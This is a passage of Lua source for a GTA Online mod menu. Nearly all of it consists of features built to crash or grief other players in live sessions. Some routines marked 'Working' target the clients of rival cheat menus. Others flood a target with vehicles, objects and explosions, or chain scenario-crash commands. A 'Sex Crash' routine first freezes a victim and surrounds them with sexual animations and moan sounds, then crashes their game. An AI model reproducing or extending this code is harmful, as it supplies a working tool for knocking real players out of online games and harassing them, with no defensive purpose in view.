        false,
        0,
        false
    )
    ENTITY.SET_ENTITY_VISIBLE(table_ladder[attach], b3)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    attach = attach + 1
end

--         _____ ________________ ________  _   __
--        / ___// ____/ ___/ ___//  _/ __ \/ | / /
--        \__ \/ __/  \__ \\__ \ / // / / /  |/ / 
--       ___/ / /___ ___/ /__/ // // /_/ / /|  /  
--      /____/_____//____/____/___/\____/_/ |_/   

--         __________  ___   _____ __  __
--        / ____/ __ \/   | / ___// / / /
--       / /   / /_/ / /| | \__ \/ /_/ /
--      / /___/ _, _/ ___ |___/ / __  /
--      \____/_/ |_/_/  |_/____/_/ /_/   


function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

local SexCrashes = menu.list(crash, "Sex Crashes", {"sexcrashes"}, "Spawns sex animations next to them before crashing")

menu.action(SexCrashes,"Sex Crash", {"sexcrash"}, "Note: Make sure they are stood still if you think freezing wont work. Credits to Legy for idea.", function()
    menu.trigger_commands("freeze" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(10)
    menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(10)
    menu.trigger_commands("attachto" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(200)
    menu.trigger_commands("dancingtopless" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(10)
    menu.trigger_commands("fsexmoan")
    util.yield(10)
    menu.trigger_commands("msexmoan")
    util.yield(10)
    menu.trigger_commands("animlapdance1")
    util.yield(1000)
    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("ngcrash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("footlettuce" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1000)
    menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(5000)
    menu.trigger_commands("attachto" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("cancelanim")
end)

local MenuCrashes = menu.list(crash, "Menu Crashes", {"menucrashes"}, "Crash specific menus. (BETA).")


menu.toggle_loop(MenuCrashes,"Stand Crash", {"standcrash"}, "Not coded Yet.", function()
    if pid ~= players.user() then
    util.toast("Stand Crash Sent to " .. players.get_name(pid))
    util.log("Stand Crash Sent to " .. players.get_name(pid))
    util.toast(":/ Failed to crash as this is not coded yet :/ ")
    end
end)

menu.toggle_loop(MenuCrashes,"2Take1 Crash", {"2take1crash"}, "Not coded Yet.", function()
    if pid ~= players.user() then
    util.toast("2Take1 Crash Sent to " .. players.get_name(pid))
    util.log("2Take1 Crash Sent to " .. players.get_name(pid))
    util.toast(":/ Failed to crash as this is not coded yet :/ ")
    end
end)

menu.toggle_loop(MenuCrashes,"X-Force Crash", {"xforcecrash"}, "Not coded Yet.", function()
    if pid ~= players.user() then
    util.toast("X-Force Crash Sent to " .. players.get_name(pid))
    util.log("X-Force Crash Sent to " .. players.get_name(pid))
    util.toast(":/ Failed to crash as this is not coded yet :/ ")
    end
end)

menu.toggle_loop(MenuCrashes,"Rebound Crash", {"reboundcrash"}, "Working.", function()
    if pid ~= players.user() then
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("taxi")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end  
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    util.toast("Rebound Crash Sent to " .. players.get_name(pid))
    util.log("Rebound Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"Cherax Crash", {"cheraxcrash"}, "Working.", function()
    if pid ~= players.user() then
    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield()
    util.toast("Cherax Crash Sent to " .. players.get_name(pid))
    util.log("Cherax Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"North Crash", {"northcrash"}, "Working.", function()
    if pid ~= players.user() then
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local michael = util.joaat("player_zero")
    while not STREAMING.HAS_MODEL_LOADED(michael) do
        STREAMING.REQUEST_MODEL(michael)
        util.yield()
    end
    local ped = entities.create_ped(0, michael, pos, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
    util.yield()
    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(ped)
    util.toast("North Crash Sent to " .. players.get_name(pid))
    util.log("North Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"Nightfall Crash", {"nightfallcrash"}, "Not coded Yet.", function()
    if pid ~= players.user() then
    util.toast("Nightfall Crash Sent to " .. players.get_name(pid))
    util.log("Nightfall Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes,"Kiddions Crash", {"kiddionscrash"}, "Working. LMFAO", function()
    if pid ~= players.user() then
    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield()
    util.toast("Kiddions Crash Sent to " .. players.get_name(pid))
    util.log("Kiddions Crash Sent to " .. players.get_name(pid))
    end
end)

menu.toggle_loop(MenuCrashes, "Any Menu Crash", {"anymenucrash"}, "", function()
    util.toast("Any Menu Crash Sent to " .. players.get_name(pid))
    util.log("Any Menu Crash Sent to " .. players.get_name(pid))
    end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local lobbycrash = menu.list(crash, "Lobby Crashes", {}, "")

local craftcrash = menu.list(crash, "Vehicle Crashes", {}, "")

menu.toggle_loop(craftcrash, "Teleport ALL Entities to Player Loop", {"tpallentitiesloop"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
	if on_toggle then
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    else
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    end
end)

--------------------------------------------------------------------------------------------------------------------------------

local spawnDistance1 = 0
local vehicleType1 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected1 = 1
local spawnedPlanes1 = {}

menu.toggle_loop(craftcrash, "Start Loop 1", {"craftloop1"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType1[selected1])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance1)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes1, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes1)
    spawnedPlanes1 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrash, 'Select your loop', {}, "", vehicleType1, 1, function (opt)
    selected1 = opt
end)

menu.slider(craftcrash, "Loop Distance", {}, "", 0, 500, spawnDistance1, 25, function(distance)
    spawnDistance1 = distance
end)


local spawnDistance2 = 0
local vehicleType2 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected2 = 1
local spawnedPlanes2 = {}

menu.toggle_loop(craftcrash, "Start Loop 2", {"craftloop2"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType2[selected2])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance2)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes2, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes2)
    spawnedPlanes2 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrash, 'Select your loop', {}, "", vehicleType2, 1, function (opt)
    selected2 = opt
end)

menu.slider(craftcrash, "Loop Distance", {}, "", 0, 500, spawnDistance2, 25, function(distance)
    spawnDistance2 = distance
end)

local spawnDistance3 = 0
local vehicleType3 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected3 = 1
local spawnedPlanes3 = {}

menu.toggle_loop(craftcrash, "Start Loop 3", {"craftloop3"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType3[selected3])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance3)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes3, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes3)
    spawnedPlanes3 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrash, 'Select your loop', {}, "", vehicleType3, 1, function (opt)
    selected3 = opt
end)

menu.slider(craftcrash, "Loop Distance", {}, "", 0, 500, spawnDistance3, 25, function(distance)
    spawnDistance3 = distance
end)

local spawnDistance4 = 0
local vehicleType4 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected4 = 1
local spawnedPlanes4 = {}

menu.toggle_loop(craftcrash, "Start Loop 4", {"craftloop4"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType4[selected4])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance4)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes4, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes4)
    spawnedPlanes4 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrash, 'Select your loop', {}, "", vehicleType4, 1, function (opt)
    selected4 = opt
end)

menu.slider(craftcrash, "Loop Distance", {}, "", 0, 500, spawnDistance4, 25, function(distance)
    spawnDistance4 = distance
end)

local spawnDistance5 = 0
local vehicleType5 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
 'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
 'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected5 = 1
local spawnedPlanes5 = {}

menu.toggle_loop(craftcrash, "Start Loop 5", {"craftloop5"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType5[selected5])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance5)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes5, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes5)
    spawnedPlanes5 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrash, 'Select your loop', {}, "", vehicleType5, 1, function (opt)
    selected5 = opt
end)

menu.slider(craftcrash, "Loop Distance", {}, "", 0, 500, spawnDistance5, 25, function(distance)
    spawnDistance5 = distance
end)


local selectedobject = 1268884662
local all_objects = {
-1268884662,
-1268884662,
4121513285,
1085274000,
1729911864,
2166988379,
3702106121,
1398809829,
1043035044,
3639322914,
464329140,
4046278932,
3785611910,
388197031,
2977746558,
659187150,
420170064,
2436749075,
1193854962,
476379176,
630616933,
3945660640,
1565925668,
175309727,
3196461136,
3251728163,
176008245,
2112015640,
993120320,
865627822,
266130508,
3762892718,
3854180205,
2804199464,
523317885,
1327834842,
1321190118,
29828513,
-1026778664,
310817095,
4130089803,
148511758,
3087007557,
2969831089,
3533371316,
2024855755,
2450168807,
297107423,
2017086435,
3553022755,
4046278932,
3639322914,
3231494328,
3271283456,
386059801,
202070568,
1971657777,
2005313754,
3859048180,
866394777,
740404217,
2409855828,
286298615,
795984016,
2374537677,
3161612443,
1165195353,
2450522579,
4260070095,
974883178,
3965551402,
3854180205,
3696781377,
4124467285,
2684801972,
3449848423,
118627012,
1565925668,
1924419321,
2201918560,
3762892718,
266130508,
1193854962, 
630616933,
476379176,
2436749075,
2154892897,
1369811908,
2420804668,
1948561556,
356462018,
462203053,
3552768664,
2057223314,
3290378943,
168901740,
303280717,
725259233,
2064599526,
4204303756,
3185604174,
1046958884,
81317377,
2539784170,
795367207,
2684668286,
827574655,
617299305,
3999634798

} 

local object_names = {

"Click Next Object >",
"Bricks",
"w_ex_pipebomb",
"Pizza's",
"prop_boombox_01",
"xm3_prop_xm3_boombox_01a",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"10",
"11",
"12",
"13",
"14",
"15",
"16",
"17",
"18",
"19",
"20",
"21",
"22",
"23",
"24",
"25",
"26",
"27",
"28",
"29",
"Dandy's",
"Keypad's",
"Brittle Bush",
"Saplin",
"Fragment",
"Gas",
"Ball",
"Flagpole",
"Combat MG",
"Mag1",
"Barrel",
"40mm",
"Corp Rope",
"prop_amb_ciggy_01",
"prop_table_03_chr",
"prop_parasol_03",
"prop_traffic_01d",
"prop_streetlight_01",
"v_serv_bs_gelx3",
"prop_table_03",
"v_serv_bs_foam1",
"v_ret_ta_paproll2",
"v_serv_bs_razor",
"prop_tv_05",
"v_ret_gc_box2",
"prop_rub_stool",
"prop_speaker_05",
"v_serv_bs_shvbrush",
"v_serv_bs_shampoo",
"v_ret_ta_spray",
"v_serv_bs_cond",
"v_serv_bs_clutter",
"v_ilev_bs_door",
"prop_ld_purse_01",
"prop_amb_phone",
"prop_bin_10b",
"prop_amb_40oz_02",
"p_amb_coffeecup_01",
"prop_coffee_mac_02",
"prop_fire_exting_2a",
"prop_wall_light_06a",
"prop_xmas_ext",
"xm_prop_x17_osphatch_col",
"reh_prop_reh_sign_jk_01a",
"reh_prop_reh_bag_para_01a",
"tr_prop_tr_meet_coll_01",
"vw_prop_vw_garage_coll_01a",
"prop_forsale_dyn_01",
"xm_prop_base_cabinet_door_01",
"xm_prop_x17dlc_rep_sign_01a",
"gr_prop_gr_bunkeddoor_col",
"v_ret_ta_firstaid",
"prop_aircon_m_01",
"prop_wall_light_02a",
"v_ret_gc_calc",
"prop_micro_04",
"prop_gumball_02",
"prop_watercooler",
"prop_radio_01",
"prop_game_clock_01",
"prop_cctv_cam_06a",
"prop_till_01",
"prop_chair_02",
"prop_chair_04a",
"xs_prop_arena_flipper_large_01a",
"xs_prop_arena_flipper_small_01a",
"xs_prop_arena_flipper_xl_01a",
"xs_prop_arena_flipper_large_01a_sf",
"xs_prop_arena_flipper_small_01a_sf",
"xs_prop_arena_flipper_xl_01a_sf",
"xs_prop_arena_flipper_large_01a_wl",
"xs_prop_arena_flipper_small_01a_wl",
"xs_prop_arena_flipper_xl_01a_wl",
"xs_prop_trophy_flipper_01a"
}

local AntiCrashCam <const> = menu.ref_by_path("Game>Camera>Anti-Crash Camera", 38)
local function RequestModel(Hash, timeout)
    STREAMING.REQUEST_MODEL(Hash)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not STREAMING.HAS_MODEL_LOADED(Hash) do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(Hash)
end
local function RequestControl(Entity, timeout)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Entity)
        util.yield()
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity)
end
local function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end
local function CreateObject(Hash, Pos, static)
    RequestModel(Hash)
    local Object = entities.create_object(Hash, Pos)
    ENTITY.FREEZE_ENTITY_POSITION(Object, (static or false))
    return Object
end


local objectc = menu.list(crash, "Object Crashes", {"objectcrashes"}, "")

local amount = 200
local delay = 100
menu.slider(objectc, "Spawn Amount", {"spawnammount"}, "", 0, 2500, amount, 50, function(val)
    amount = val
end)

menu.slider(objectc, "Spawn Delay", {"spawndelay"}, "", 0, 500, delay, 10, function(val)
    delay = val
end)

menu.list_select(objectc, "Object Model", {"objectmodel"}, "", object_names, 1, function(val)
    selectedobject = all_objects[val]
end)

menu.toggle_loop(objectc, "Send Objects", {"sendobjects"}, "", function()
    
    local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
    local myped = PLAYER.PLAYER_PED_ID()
    local mypos = ENTITY.GET_ENTITY_COORDS(myped, true)
    local objects = {}
    for i = 1, amount do
        if not players.exists(pid) then
            break
        end
        ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
        ppos.x = ppos.x + math.random(-1, 1)
        ppos.y = ppos.y + math.random(-1, 1)
        objects[#objects+1] = CreateObject(selectedobject, ppos)
        FIRE.ADD_EXPLOSION(ppos.x, ppos.y, ppos.z, 0, 1.0, false, true, 0.0, false)
        util.yield(delay)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(selectedobject)
    if players.exists(pid) then
        util.yield(2500)
    end
    ClearEntities(objects)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, false, false)
    util.yield(50)
    local allobjs = entities.get_all_objects_as_handles()
    for i, object in ipairs(allobjs) do
        if ENTITY.GET_ENTITY_MODEL(object) == 3026082634 or ENTITY.GET_ENTITY_MODEL(object) == selectedobject then
            entities.delete_by_handle(object)
        end
    end
    util.yield(50)
    
    util.toast("[Object Crash] Finished.")
end)


local TaskCrashes = menu.list(crash, "Task Crashes", {"taskcrashes"}, "Spawns animations next to them for crashing.")

menu.divider(TaskCrashes, "_________________________________________")

       menu.divider(TaskCrashes, "_________________________________________")

       menu.toggle(TaskCrashes, "All Scenario Crashes", {"togglescenariocrashes"}, "It's risky to spectate using this but your call", function(on_toggle)
        if on_toggle then
            util.yield()
            menu.trigger_commands("anticrashcamera")
            util.yield()
            menu.trigger_commands("bongoguitarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("cigarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("spatularcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("barbellcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("hammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("fishingcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("jackhammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("broomcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("drunkcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("trowelcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("wincleancrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("torchcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("coffeecrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
        else
            util.yield()
            menu.trigger_commands("bongoguitarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("cigarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("spatularcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("barbellcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("hammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("fishingcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("jackhammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("broomcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("drunkcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("trowelcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("wincleancrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("torchcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("coffeecrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("noentities")
            util.yield(200)
            menu.trigger_commands("noentities")
            util.yield()
            menu.trigger_commands("anticrashcamera")
            end
        end)
       
       menu.divider(TaskCrashes, "_________________________________________")


       local peds = 5
